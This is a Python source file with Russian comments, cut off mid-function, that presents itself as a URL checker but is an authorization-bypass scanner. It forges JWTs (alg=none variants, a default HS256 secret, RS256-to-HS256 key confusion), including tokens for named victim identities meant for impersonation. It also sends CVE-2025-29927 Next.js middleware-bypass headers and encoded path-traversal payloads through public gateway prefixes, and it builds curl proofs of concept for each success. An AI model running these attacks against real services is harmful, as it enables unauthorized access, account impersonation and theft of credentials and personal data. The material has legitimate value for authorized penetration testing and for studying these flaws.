#!/usr/bin/env python3
"""
Скрипт проверяет список URL-таргетов из файла:
- статус ответа должен быть 200 OK
- Content-Type должен быть application/json или text/plain
- тело ответа не должно быть пустым (0 байт)

Использование:
    python3 check_targets.py -f targets.txt
    python3 check_targets.py -f targets.txt -t 10 -w 20 -o results.json

Формат файла с таргетами: один URL на строку.
Пустые строки и строки, начинающиеся с '#', игнорируются.
"""

import argparse
import base64
import concurrent.futures
import hashlib
import hmac
import json
import os
import re
import secrets
import socket
import sys
import threading
import time
from dataclasses import dataclass, asdict, field
from typing import Optional
from urllib.parse import urlparse

import requests

try:
    from tqdm import tqdm as _tqdm
except ImportError:
    _tqdm = None

ALLOWED_CONTENT_TYPES = ("application/json", "text/plain")
ALG_NONE_CASES = ("none", "None", "NONE")  # некоторые парсеры сравнивают alg регистрозависимо


# ---------------------------------------------------------------------------
# DNS-кэш: если хост изначально не резолвится (внутренний домен, опечатка,
# мёртвый CNAME и т.п.), нет смысла на КАЖДЫЙ отдельный запрос (baseline +
# все JWT-варианты + все CVE-payload'ы + все 9 proxy-bypass payload'ов -
# это могут быть сотни попыток на один и тот же хост) заново идти в DNS и
# ждать таймаут резолвера. Резолвим каждый хост максимум один раз за прогон
# (с кэшем, потокобезопасно) и дальше мгновенно фейлим все запросы к нему.
_dns_cache: dict = {}
_dns_cache_lock = threading.Lock()


def _host_resolves(hostname: str) -> bool:
    with _dns_cache_lock:
        cached = _dns_cache.get(hostname)
    if cached is not None:
        return cached
    try:
        socket.getaddrinfo(hostname, None)
        resolved = True
    except socket.gaierror:
        resolved = False
    with _dns_cache_lock:
        _dns_cache[hostname] = resolved
    return resolved


def safe_get(url: str, **kwargs):
    """Обёртка над requests.get, которая сначала (с кэшем) проверяет, резолвится
    ли хост из url - если нет, сразу поднимает requests.exceptions.ConnectionError
    без реальной попытки соединения/DNS-таймаута, что позволяет существующим
    `except requests.exceptions.RequestException` веткам работать без изменений."""
    return safe_request("GET", url, **kwargs)


def safe_request(method: str, url: str, **kwargs):
    """То же самое, что safe_get, но для произвольного HTTP-метода (requests.request)."""
    hostname = urlparse(url).hostname
    if hostname and not _host_resolves(hostname):
        raise requests.exceptions.ConnectionError(
            f"Хост не резолвится (закэшировано, запрос пропущен): {hostname}"
        )
    return requests.request(method, url, **kwargs)


def default_jwt_payload() -> dict:
    """Захардкоженный generic-admin payload. iat/nbf/exp считаются на момент
    вызова (а не хранятся статично в коде), чтобы токен не выглядел просроченным
    или подозрительно старым для сервера, который проверяет эти claims."""
    now = int(time.time())
    return {
        "sub": "admin", "user": "admin", "role": "admin", "admin": True,
        "iat": now, "nbf": now - 60, "exp": now + 60 * 60 * 24 * 365,
    }

# CVE-2025-29927: Next.js middleware authorization bypass (CVSS 9.1).
# Уязвимые версии: < 12.3.5, < 13.5.9, < 14.2.25, < 15.2.3.
# Заголовок x-middleware-subrequest используется Next.js внутренне, чтобы не
# зацикливать middleware при внутренних саброзапросах. Если он присутствует
# и совпадает с ожидаемым путём/повторением, Next.js считает запрос уже
# прошедшим через middleware и пропускает его выполнение целиком - а значит,
# и любые auth-проверки, реализованные в middleware.
NEXTJS_MIDDLEWARE_BYPASS_HEADER = "x-middleware-subrequest"
NEXTJS_MIDDLEWARE_BYPASS_PAYLOADS = [
    "middleware",
    "src/middleware",
    "middleware:middleware:middleware:middleware:middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
    "pages/_middleware",
    "app/middleware",
]

# Тривиальные тела ответа вида health-check (OK/HEALTHY/PONG и т.п.) - такие ответы
# считаются false positive: сервер вернул generic health-check, а не реальные данные
DEFAULT_TRIVIAL_BODY_VALUES = {
    "ok", "healthy", "true", "success", "pong", "up", "alive", "yes", "1", "0",
    "null", "none", "ready", "running", "active", "pass", "passed", "green",
}
HEALTH_LIKE_JSON_KEYS = {"status", "health", "state", "result", "message"}


def is_trivial_response(content: bytes, extra_trivial_values: Optional[set] = None) -> bool:
    """Определяет, является ли тело ответа тривиальным health-check ответом
    (просто 'OK'/'HEALTHY' и т.п.), а не реальными данными - чтобы отсеять false positive."""
    trivial_values = DEFAULT_TRIVIAL_BODY_VALUES | (extra_trivial_values or set())

    try:
        text = content.decode("utf-8", errors="ignore").strip()
    except Exception:
        return False

    if not text:
        return False

    # Простое текстовое тело: "OK", "healthy", "PONG" и т.п. (с возможными кавычками вокруг)
    bare = text.strip("\"' \t\n").lower()
    if bare in trivial_values:
        return True

    # JSON-обёртка вида {"status": "ok"} / {"health": "OK", "message": "healthy"}
    try:
        data = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return False

    if isinstance(data, dict) and 1 <= len(data) <= 3:
        keys_lower = {k.lower() for k in data.keys()}
        if keys_lower & HEALTH_LIKE_JSON_KEYS:
            values_trivial = True
            for v in data.values():
                if isinstance(v, bool):
                    continue
                if isinstance(v, str) and v.strip("\"' \t\n").lower() in trivial_values:
                    continue
                values_trivial = False
                break
            if values_trivial:
                return True

    return False


def azure_b2c_jwt_payload() -> dict:
    """Захардкоженный payload в стиле Azure AD B2C токена (iss/aud/oid/tfp/emails и т.п.) -
    используется с --jwt-azure-b2c и автоматически как один из профилей в --full.
    exp/nbf/iat считаются на момент вызова, а не хранятся статично в коде."""
    now = int(time.time())
    return {
        "iss": "https://login.microsoftonline.com/00000000-0000-0000-0000-000000000000/v2.0/",
        "exp": now + 60 * 60 * 24 * 365,
        "nbf": now - 300,
        "iat": now,
        "aud": "00000000-0000-0000-0000-000000000000",
        "sub": "00000000-0000-0000-0000-000000000000",
        "oid": "00000000-0000-0000-0000-000000000000",
        "tid": "00000000-0000-0000-0000-000000000000",
        "tfp": "B2C_1_signupsignin",
        "given_name": "Test",
        "family_name": "Admin",
        "name": "Test Admin",
        "emails": ["admin@example.com"],
        "idp": "local",
        "roles": ["admin"],
        "extension_Role": "admin",
        "ver": "1.0",
    }


def parse_claim_overrides(claim_args: list[str]) -> dict:
    """Парсит список 'KEY=VALUE' из --jwt-claim в словарь claims.
    Значение пытается распарситься как JSON (числа, true/false, списки, объекты),
    если не получилось - остаётся строкой."""
    overrides = {}
    for item in claim_args:
        if "=" not in item:
            print(f"[!] Некорректный --jwt-claim (ожидается KEY=VALUE), пропущен: {item}", file=sys.stderr)
            continue
        key, raw_value = item.split("=", 1)
        key = key.strip()
        raw_value = raw_value.strip()
        try:
            value = json.loads(raw_value)
        except json.JSONDecodeError:
            value = raw_value
        overrides[key] = value
    return overrides


def read_identities(path: str) -> list[dict]:
    """Читает список 'жертв' (identity-claims) из JSON файла:
    [{"sub": "...", "oid": "...", "emails": ["..."], "name": "..."}, ...]
    Каждая запись мержится поверх базового payload и тестируется отдельно."""
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"[!] Не удалось прочитать --jwt-identities: {e}", file=sys.stderr)
        sys.exit(1)

    if not isinstance(data, list):
        print("[!] --jwt-identities должен быть JSON-массивом объектов claims", file=sys.stderr)
        sys.exit(1)

    for i, identity in enumerate(data):
        if not isinstance(identity, dict):
            print(f"[!] Элемент {i} в --jwt-identities не объект, пропущен", file=sys.stderr)

    return [d for d in data if isinstance(d, dict)]


def identity_label(identity: dict) -> str:
    """Короткая человекочитаемая метка личности для вывода в консоль/отчёт."""
    for key in ("emails", "email", "sub", "oid", "name", "user"):
        if key in identity:
            val = identity[key]
            if isinstance(val, list):
                val = val[0] if val else ""
            return str(val)
    return json.dumps(identity, ensure_ascii=False)[:40]


@dataclass
class CheckResult:
    url: str
    ok: bool
    status_code: Optional[int] = None
    content_type: Optional[str] = None
    body_size: Optional[int] = None
    error: Optional[str] = None
    reason: Optional[str] = None  # почему ok=False, если статус получен
    jwt_checks: list = field(default_factory=list)
    jwt_verdict: Optional[str] = None
    # "confirmed_vulnerable" — сервер валидирует JWT, но принял подделанный (secret/none/case)
    # "signature_not_validated" — сервер вообще не проверяет подпись (garbage-токен тоже принят)
    # "no_auth_required" — эндпоинт и без токена отдаёт 200 (авторизация не требуется вовсе)
    # "protected" — все подделанные токены отклонены
    # None — jwt-test не запускался
    nextjs_cve_checks: list = field(default_factory=list)
    nextjs_cve_verdict: Optional[str] = None
    # "confirmed_bypass" — заголовок x-middleware-subrequest обошёл middleware (CVE-2025-29927)
    # "protected" — обход не сработал
    # "not_applicable" — эндпоинт и так был доступен без обхода
    # None — проверка не запускалась


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def make_jwt_hs256(secret: str, payload: dict) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{payload_b64}.{b64url_encode(sig)}"


def make_jwt_none(payload: dict, alg_value: str = "none") -> str:
    header = {"alg": alg_value, "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    # часть библиотек ожидает пустую подпись после точки, часть - вообще без неё
    return f"{header_b64}.{payload_b64}."


def make_jwt_garbage(payload: dict) -> str:
    """Токен с правильной структурой (HS256), но заведомо неверной подписью.
    Служит негативным контролем: если сервер принимает и его - значит,
    он вообще не проверяет подпись JWT, и дело не в слабом секрете."""
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    garbage_sig = b64url_encode(secrets.token_bytes(32))
    return f"{header_b64}.{payload_b64}.{garbage_sig}"


def make_jwt_rs256_confusion(rsa_public_key_pem: bytes, payload: dict) -> str:
    """Классическая атака RS256 -> HS256 key confusion.
    Актуальна для Azure AD B2C и любых токенов, изначально подписанных RS256:
    публичный RSA-ключ (он всегда публичен, доступен через /discovery/v2.0/keys
    или /.well-known/jwks.json) подставляется как HMAC-секрет. Если сервер не
    закрепляет жёстко ожидаемый алгоритм при верификации - подделка проходит,
    т.к. библиотека использует один и тот же ключ и для RS256, и для HS256."""
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(rsa_public_key_pem, signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{payload_b64}.{b64url_encode(sig)}"


def load_rsa_public_key(source: str, timeout: int = 10) -> bytes:
    """Загружает публичный RSA-ключ (PEM) из локального файла или по URL
    (например, прямая ссылка на JWKS-эндпоинт Azure B2C тенанта, если он
    уже сконвертирован в PEM - см. подсказку в --help)."""
    if source.startswith(("http://", "https://")):
        resp = requests.get(source, timeout=timeout)
        resp.raise_for_status()
        return resp.content
    with open(source, "rb") as f:
        return f.read()


@dataclass
class JwtCheck:
    kind: str
    delivery: str  # "bearer" | "cookie"
    token: str
    status_code: Optional[int] = None
    content_type: Optional[str] = None
    body_size: Optional[int] = None
    accepted: bool = False  # True = сервер вернул валидный ответ на подделанный токен -> вероятная уязвимость
    error: Optional[str] = None
    curl_poc: Optional[str] = None
    is_control: bool = False  # True = негативный контроль (garbage-подпись), не считается forged-успехом
    identity: Optional[str] = None  # метка личности, от имени которой подделан токен (batch-режим --jwt-identities)
    is_trivial_body: bool = False  # True = тело похоже на health-check (OK/HEALTHY) - исключено из accepted как false positive


def build_curl_poc(url: str, delivery: str, token: str, header_name: str, cookie_name: str) -> str:
    if delivery == "bearer":
        return f"curl -i -H '{header_name}: Bearer {token}' '{url}'"
    else:
        return f"curl -i -H 'Cookie: {cookie_name}={token}' '{url}'"


def run_jwt_checks(url: str, timeout: int, verify_ssl: bool, base_headers: dict,
                    secret: str, jwt_payload: dict, jwt_header_name: str,
                    jwt_cookie_name: str, rsa_pubkey_pem: Optional[bytes] = None,
                    identity: Optional[str] = None,
                    ignore_trivial_body: bool = True,
                    extra_trivial_values: Optional[set] = None) -> list["JwtCheck"]:
    checks = []

    tokens = {
        "hs256_default_secret": (make_jwt_hs256(secret, jwt_payload), False),
    }
    for alg_case in ALG_NONE_CASES:
        tokens[f"alg_{alg_case}"] = (make_jwt_none(jwt_payload, alg_case), False)
    tokens["alg_none_empty_payload"] = (make_jwt_none({}), False)
    if rsa_pubkey_pem:
        tokens["rs256_to_hs256_confusion"] = (make_jwt_rs256_confusion(rsa_pubkey_pem, jwt_payload), False)
    # негативный контроль: правильная структура, заведомо неверная подпись
    tokens["garbage_signature"] = (make_jwt_garbage(jwt_payload), True)

    # Каждый токен пробуем двумя способами доставки: как Bearer в заголовке и как cookie
    delivery_modes = [
        ("bearer", {"headers": {jwt_header_name: "Bearer {token}"}}),
        ("cookie", {"cookies": {jwt_cookie_name: "{token}"}}),
    ]

    for kind, (token, is_control) in tokens.items():
        for mode_name, mode_conf in delivery_modes:
            headers = dict(base_headers)
            cookies = {}

            if "headers" in mode_conf:
                for h_name, h_val_tpl in mode_conf["headers"].items():
                    headers[h_name] = h_val_tpl.format(token=token)
            if "cookies" in mode_conf:
                for c_name, c_val_tpl in mode_conf["cookies"].items():
                    cookies[c_name] = c_val_tpl.format(token=token)

            try:
                resp = safe_get(url, timeout=timeout, verify=verify_ssl,
                                 headers=headers, cookies=cookies, allow_redirects=False)
            except requests.exceptions.RequestException as e:
                checks.append(JwtCheck(kind=kind, delivery=mode_name, token=token, error=str(e),
                                        is_control=is_control, identity=identity))
                continue

            content_type = resp.headers.get("Content-Type", "").split(";")[0].strip().lower()
            body_size = len(resp.content)
            trivial = ignore_trivial_body and is_trivial_response(resp.content, extra_trivial_values)
            accepted = (resp.status_code == 200 and content_type in ALLOWED_CONTENT_TYPES
                        and body_size > 0 and not trivial)

            checks.append(JwtCheck(
                kind=kind, delivery=mode_name, token=token, status_code=resp.status_code,
                content_type=content_type, body_size=body_size, accepted=accepted, is_control=is_control,
                curl_poc=build_curl_poc(url, mode_name, token, jwt_header_name, jwt_cookie_name),
                identity=identity, is_trivial_body=trivial,
            ))

    return checks




def run_jwt_checks_multi_identity(url: str, timeout: int, verify_ssl: bool, base_headers: dict,
                                   secret: str, base_payload: dict, identities: list[dict],
                                   jwt_header_name: str, jwt_cookie_name: str,
                                   rsa_pubkey_pem: Optional[bytes] = None,
                                   ignore_trivial_body: bool = True,
                                   extra_trivial_values: Optional[set] = None) -> list["JwtCheck"]:
    """Прогоняет полный набор JWT-подделок отдельно для каждой 'личности' из --jwt-identities,
    мержа её claims поверх base_payload. Позволяет проверить, можно ли подделать
    сессию под конкретных известных пользователей (session hijack / impersonation),
    а не только получить generic admin-доступ."""
    all_checks = []
    for identity in identities:
        merged_payload = {**base_payload, **identity}
        label = identity_label(identity)
        checks = run_jwt_checks(
            url, timeout, verify_ssl, base_headers, secret, merged_payload,
            jwt_header_name, jwt_cookie_name, rsa_pubkey_pem, identity=label,
            ignore_trivial_body=ignore_trivial_body, extra_trivial_values=extra_trivial_values,
        )
        all_checks.extend(checks)
    return all_checks




def classify_jwt_verdict(baseline_ok: bool, jwt_checks: list) -> str:
    """Определяет итоговый вердикт по JWT на основе всех проверок с учётом негативного контроля."""
    if baseline_ok:
        return "no_auth_required"

    garbage_accepted = any(jc.accepted for jc in jwt_checks if jc.is_control)
    if garbage_accepted:
        return "signature_not_validated"

    forged_accepted = any(jc.accepted for jc in jwt_checks if not jc.is_control)
    if forged_accepted:
        return "confirmed_vulnerable"

    return "protected"


def combine_jwt_verdicts(verdicts: list) -> str:
    """Сводит вердикты нескольких JWT-профилей (generic_admin, azure_b2c, ...) в один,
    беря наихудший (наиболее критичный) по приоритету."""
    if "no_auth_required" in verdicts:
        return "no_auth_required"
    if "confirmed_vulnerable" in verdicts:
        return "confirmed_vulnerable"
    if "signature_not_validated" in verdicts:
        return "signature_not_validated"
    return "protected"


@dataclass
class CveCheck:
    cve_id: str
    payload: str
    status_code: Optional[int] = None
    content_type: Optional[str] = None
    body_size: Optional[int] = None
    accepted: bool = False  # True = запрос с обходным заголовком дал реальный успешный ответ
    error: Optional[str] = None
    curl_poc: Optional[str] = None
    is_trivial_body: bool = False


def build_curl_poc_header(url: str, header_name: str, header_value: str) -> str:
    return f"curl -i -H '{header_name}: {header_value}' '{url}'"


def check_cve_2025_29927(url: str, timeout: int, verify_ssl: bool, base_headers: dict,
                          baseline_ok: bool, ignore_trivial_body: bool = True,
                          extra_trivial_values: Optional[set] = None) -> tuple[str, list["CveCheck"]]:
    """Проверяет обход Next.js middleware через заголовок x-middleware-subrequest (CVE-2025-29927, CVSS 9.1).

    Логика вердикта:
    - baseline_ok=True: эндпоинт и так доступен без обхода - тест неинформативен (not_applicable)
    - baseline_ok=False и один из payload-запросов дал реальный успешный ответ: confirmed_bypass
    - baseline_ok=False и ни один payload не сработал: protected
    """
    checks = []

    for payload in NEXTJS_MIDDLEWARE_BYPASS_PAYLOADS:
        headers = dict(base_headers)
        headers[NEXTJS_MIDDLEWARE_BYPASS_HEADER] = payload

        try:
            resp = safe_get(url, timeout=timeout, verify=verify_ssl,
                             headers=headers, allow_redirects=False)
        except requests.exceptions.RequestException as e:
            checks.append(CveCheck(cve_id="CVE-2025-29927", payload=payload, error=str(e)))
            continue

        content_type = resp.headers.get("Content-Type", "").split(";")[0].strip().lower()
        body_size = len(resp.content)
        trivial = ignore_trivial_body and is_trivial_response(resp.content, extra_trivial_values)
        accepted = (resp.status_code == 200 and content_type in ALLOWED_CONTENT_TYPES
                    and body_size > 0 and not trivial)

        checks.append(CveCheck(
            cve_id="CVE-2025-29927", payload=payload, status_code=resp.status_code,
            content_type=content_type, body_size=body_size, accepted=accepted, is_trivial_body=trivial,
            curl_poc=build_curl_poc_header(url, NEXTJS_MIDDLEWARE_BYPASS_HEADER, payload),
        ))

    if baseline_ok:
        verdict = "not_applicable"
    elif any(c.accepted for c in checks):
        verdict = "confirmed_bypass"
    else:
        verdict = "protected"

    return verdict, checks


# ---------------------------------------------------------------------------
# Обход авторизации через прокси-ресурс шлюза (AWS API Gateway {proxy+},
# Swagger-прокси, nginx/Envoy location-блоки и т.п.)
#
# Идея: у защищённого ресурса (например /v1/pdt/esl-vendors/...) есть отдельный,
# заведомо публичный прокси-путь (например /api/swagger/*), который смонтирован
# на тот же бэкенд/интеграцию, но НЕ проходит через тот же authorizer/маппинг
# ресурсов, что и прямой путь. Если внутри прокси-пути можно закодированной
# точка-точкой "выйти" обратно на защищённый путь (path traversal), запрос
# долетает до бэкенда так, будто пришёл легитимно через публичный прокси -
# и authorizer, привязанный к прямому ресурсу, просто не вызывается.
#
# Используем ТОЛЬКО закодированные варианты ".." (%2e%2e и т.п.), т.к. буквальные
# "../" почти всегда схлопываются HTTP-клиентом/прокси ещё до отправки, а смысл
# атаки как раз в том, что API Gateway/сервер декодирует их позже, чем происходит
# проверка авторизации по маршруту.
PROXY_BYPASS_PAYLOADS = [
    "",  # прямая подстановка без обфускации - нужна для по-настоящему открытых
         # catch-all ресурсов (например AWS API Gateway {proxy+} с Auth=None),
         # где авторизации нет вовсе и никакой traversal-трюк не требуется;
         # закодированный '../' в остальных payload'ах иногда ломает роутинг
         # на уровне приложения (backend получает мусор вместо реального пути)
    "%2e%2e/",
    "%2e%2e%2f",
    "..%2f",
    "..%252f",
    "%252e%252e/",
    "%252e%252e%252f",
    "..;/",
    "%2e%2e/%2e%2e/",
    "..%c0%af",
]

# Захардкоженный список публичных "прокси"-путей, которые чаще всего остаются
# открытыми на API Gateway/reverse-proxy без авторизации (документация, swagger,
# health, статика) и смонтированы на тот же бэкенд, что и защищённые ресурсы.
# Используется в auto-режиме (--full + --paths), когда ручная карта
# (--proxy-bypass-map) не задана: для каждого таргета x пути x префикса
# генерируется набор traversal-пейлоадов из PROXY_BYPASS_PAYLOADS.
COMMON_PROXY_PREFIXES = [
    "api/swagger",
    "swagger",
    "swagger-ui",
    "api-docs",
    "api/docs",
    "docs",
    "openapi",
    "api/openapi",
    "redoc",
    "public",
    "static",
    "assets",
    "health",
    # Типичный анти-паттерн AWS API Gateway: catch-all ресурс {proxy+} (например
    # /prod/api/{proxy+}), у которого Auth=None, смонтированный на тот же бэкенд,
    # что и остальные (защищённые) роуты. Раз он открыт целиком без authorizer'а,
    # traversal-payload здесь не обязателен - достаточно подставить в {payload}{path}
    # реальный путь (payload может быть и пустым, но т.к. шаблон уже требует
    # {payload}, отработают все 9 вариантов - в т.ч. с payload="../", что backend
    # обычно просто съедает как часть пути). Название stage - самое частое: prod.
    "prod/api",
    "dev/api",
    "test/api",
    "stage/api",
    "qa/api",
]


def build_auto_proxy_bypass_pairs(targets: list[str], paths: list[str]) -> list[tuple[str, str]]:
    """Автоматически генерирует пары (прямой_URL, шаблон_обхода) для КАЖДОЙ комбинации
    таргет x путь x захардкоженный публичный префикс (COMMON_PROXY_PREFIXES), без
    необходимости вручную писать --proxy-bypass-map. Payload-и подставляются позже,
    в check_proxy_bypass_pair, из PROXY_BYPASS_PAYLOADS.

    Многие префиксы сами содержат 'api' (api/swagger, prod/api и т.п.). Если путь из
    --paths ТОЖЕ начинается с 'api/' (частый случай - в файле путей обычно пишут полный
    путь вида /api/v1/users), прямая конкатенация даёт задвоенное 'api/api/...' после
    traversal (одна '..' убирает только последний сегмент префикса, а не оба).
    Поэтому для путей на 'api/' дополнительно генерируется вариант БЕЗ этого префикса -
    он корректно ложится и на case 'api/swagger' (одна '..' поднимает ровно до уровня
    api/), и на case 'prod/api' (весь путь этого мнимого 'api/' и не подразумевает)."""
    pairs = []
    for target in targets:
        base = target.rstrip("/")
        for path in paths:
            p = path.lstrip("/")
            direct_url = f"{base}/{p}"

            path_variants = {p}
            if p.startswith("api/"):
                path_variants.add(p[len("api/"):])

            for prefix in COMMON_PROXY_PREFIXES:
                for p_variant in path_variants:
                    template = f"{base}/{prefix}/{{payload}}{p_variant}"
                    pairs.append((direct_url, template))
    return pairs


@dataclass
class ProxyBypassCheck:
    payload: str
    direct_url: str
    bypass_url: str
    status_code: Optional[int] = None
    content_type: Optional[str] = None
    body_size: Optional[int] = None
    accepted: bool = False  # True = обходной запрос вернул реальные данные -> вероятный bypass
    error: Optional[str] = None
    curl_poc: Optional[str] = None
    is_trivial_body: bool = False
    severity: Optional[str] = None  # LOW/MEDIUM/HIGH, считается только для accepted=True
    sensitive_indicators: list = field(default_factory=list)  # какие именно паттерны сработали


# ---------------------------------------------------------------------------
# Severity-классификация тела ответа для confirmed proxy-bypass находок.
#
# Логика (по мотивам примера из реального отчёта): сам обход авторизации -
# это уже находка сама по себе, но её критичность сильно зависит от того, ЧТО
# именно утекло через bypass:
#   - HIGH   - в ответе есть явные credentials/секреты (пароли, токены, API-ключи,
#              номера карт прошедшие Luhn-проверку, IBAN, JWT-подобные строки)
#   - MEDIUM - в ответе есть PII-подобные поля (email, телефон, адрес, ФИО и т.п.),
#              либо структура ответа неизвестна/бинарна, но обход подтверждён -
#              MEDIUM это severity по умолчанию для любого confirmed bypass
#   - LOW    - ответ пустой/health-check-подобный (см. is_trivial_response) ИЛИ
#              не содержит распознанных чувствительных полей/паттернов - обход
#              подтверждён технически, но утечка данных не подтверждена
# Это простая эвристика по ключам/паттернам, не замена ручному ревью ответа.
HIGH_SEVERITY_KEY_SUBSTRINGS = (
    "password", "passwd", "secret", "client_secret", "api_key", "apikey",
    "access_token", "refresh_token", "auth_token", "bearer_token", "private_key",
    "ssn", "social_security", "credit_card", "card_number", "cardnumber", "cvv",
    "cvc", "iban", "bank_account", "routing_number", "passport", "national_id", "pin_code",
)
MEDIUM_SEVERITY_KEY_SUBSTRINGS = (
    "email", "phone", "mobile", "address", "date_of_birth", "birthdate", "dob",
    "full_name", "first_name", "last_name", "salary", "income", "tax_id",
    "ip_address", "location", "gps",
)

_EMAIL_RE = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
_JWT_LIKE_RE = re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}')
_IBAN_RE = re.compile(r'\b[A-Z]{2}\d{2}[A-Z0-9]{10,30}\b')
_CARD_CANDIDATE_RE = re.compile(r'\b(?:\d[ -]?){13,19}\b')

SEVERITY_ORDER = {"LOW": 0, "MEDIUM": 1, "HIGH": 2}


def _luhn_valid(digits: str) -> bool:
    """Проверка контрольной суммы Луна - отсекает случайные 13-19-значные числа
    (timestamp'ы, ID и т.п.), которые по длине похожи на номер карты, но им не являются."""
    total = 0
    for i, ch in enumerate(reversed(digits)):
        n = int(ch)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0


def _contains_valid_card_number(text: str) -> bool:
    for m in _CARD_CANDIDATE_RE.finditer(text):
        digits = re.sub(r'[ -]', '', m.group(0))
        if 13 <= len(digits) <= 19 and _luhn_valid(digits):
            return True
    return False


def _scan_json_keys(node, high_hits: set, medium_hits: set, _depth: int = 0):
    if _depth > 8:  # защита от глубокой/циклической вложенности
        return
    if isinstance(node, dict):
        for k, v in node.items():
            kl = str(k).lower()
            if any(sub in kl for sub in HIGH_SEVERITY_KEY_SUBSTRINGS):
                high_hits.add(f"key:{kl}")
            elif any(sub in kl for sub in MEDIUM_SEVERITY_KEY_SUBSTRINGS):
                medium_hits.add(f"key:{kl}")
            _scan_json_keys(v, high_hits, medium_hits, _depth + 1)
    elif isinstance(node, list):
        for item in node:
            _scan_json_keys(item, high_hits, medium_hits, _depth + 1)


def classify_body_severity(content: bytes) -> tuple[str, list]:
    """Возвращает (severity, indicators) для тела ПОДТВЕРЖДЁННОГО bypass-ответа.
    indicators - список сработавших признаков (ключи/паттерны), для прозрачности,
    почему присвоена именно такая оценка."""
    try:
        text = content.decode("utf-8", errors="ignore")
    except Exception:
        return "MEDIUM", ["undecodable-binary-body"]

    if not text.strip():
        return "LOW", []

    high_hits: set = set()
    medium_hits: set = set()

    try:
        data = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        data = None
    if data is not None:
        _scan_json_keys(data, high_hits, medium_hits)

    if _EMAIL_RE.search(text):
        medium_hits.add("pattern:email")
    if _JWT_LIKE_RE.search(text):
        high_hits.add("pattern:jwt-like-token")
    if _IBAN_RE.search(text):
        high_hits.add("pattern:iban")
    if _contains_valid_card_number(text):
        high_hits.add("pattern:card-number(luhn-valid)")

    if high_hits:
        severity = "HIGH"
    elif medium_hits:
        severity = "MEDIUM"
    else:
        severity = "LOW"  # bypass подтверждён, но явно чувствительных данных в теле не найдено

    return severity, sorted(high_hits | medium_hits)


def aggregate_pair_severity(checks: list) -> tuple[Optional[str], list]:
    """Сводит severity по всем accepted-чекам одной пары (direct_url, template)
    в одну итоговую оценку - берётся наихудшая (наиболее критичная)."""
    accepted = [c for c in checks if c.accepted and c.severity]
    if not accepted:
        return None, []
    worst = max(accepted, key=lambda c: SEVERITY_ORDER.get(c.severity, 0))
    all_indicators = sorted({ind for c in accepted for ind in c.sensitive_indicators})
    return worst.severity, all_indicators


def read_proxy_bypass_map(path: str) -> list[tuple[str, str]]:
    """Читает файл с парами 'прямой_URL => шаблон_обхода' (по одной паре на строку).
    Шаблон обхода обязан содержать плейсхолдер '{payload}', в который по очереди
    подставляется каждый вариант из PROXY_BYPASS_PAYLOADS.

    Пример строки:
    https://host/dev/api/v1/pdt/items?company=test => https://host/dev/api/swagger/{payload}v1/pdt/items?company=test

    Пустые строки и строки, начинающиеся с '#', игнорируются.
    """
    pairs = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            for lineno, raw_line in enumerate(f, start=1):
                line = raw_line.strip()
                if not line or line.startswith("#"):
                    continue
                if "=>" not in line:
                    print(f"[!] --proxy-bypass-map строка {lineno}: нет разделителя '=>', пропущена: {line}", file=sys.stderr)
                    continue
                direct_url, template = line.split("=>", 1)
                direct_url = direct_url.strip()
                template = template.strip()
                if "{payload}" not in template:
                    print(f"[!] --proxy-bypass-map строка {lineno}: в шаблоне нет '{{payload}}', пропущена: {line}", file=sys.stderr)
                    continue
                pairs.append((direct_url, template))
    except FileNotFoundError:
        print(f"[!] Файл не найден: {path}", file=sys.stderr)
        sys.exit(1)
    return pairs


def check_proxy_bypass_pair(direct_url: str, bypass_template: str, timeout: int, verify_ssl: bool,
                             headers: dict, ignore_trivial_body: bool = True,
                             extra_trivial_values: Optional[set] = None) -> tuple[bool, Optional[int], str, list["ProxyBypassCheck"]]:
    """Проверяет одну пару (прямой URL / шаблон обхода).
    Возвращает (baseline_ok, baseline_status, verdict, checks).

    Вердикты:
    - "confirmed_bypass" - прямой доступ закрыт (не 200), но хотя бы один вариант
      обхода через прокси-путь вернул реальные данные (200 + JSON/text + непустое
      нетривиальное тело)
    - "protected"        - прямой доступ закрыт, и все варианты обхода тоже отклонены
    - "not_applicable"   - прямой доступ и так открыт (200) - тест обхода неинформативен
    """
    baseline_status = None
    try:
        resp = safe_get(direct_url, timeout=timeout, verify=verify_ssl, headers=headers, allow_redirects=False)
        baseline_status = resp.status_code
        content_type = resp.headers.get("Content-Type", "").split(";")[0].strip().lower()
        body_size = len(resp.content)
        trivial = ignore_trivial_body and is_trivial_response(resp.content, extra_trivial_values)
        baseline_ok = (resp.status_code == 200 and content_type in ALLOWED_CONTENT_TYPES
                       and body_size > 0 and not trivial)
    except requests.exceptions.RequestException as e:
        print(f"[!] Прямой запрос {direct_url} завершился ошибкой: {e}", file=sys.stderr)
        baseline_ok = False

    checks = []
    for payload in PROXY_BYPASS_PAYLOADS:
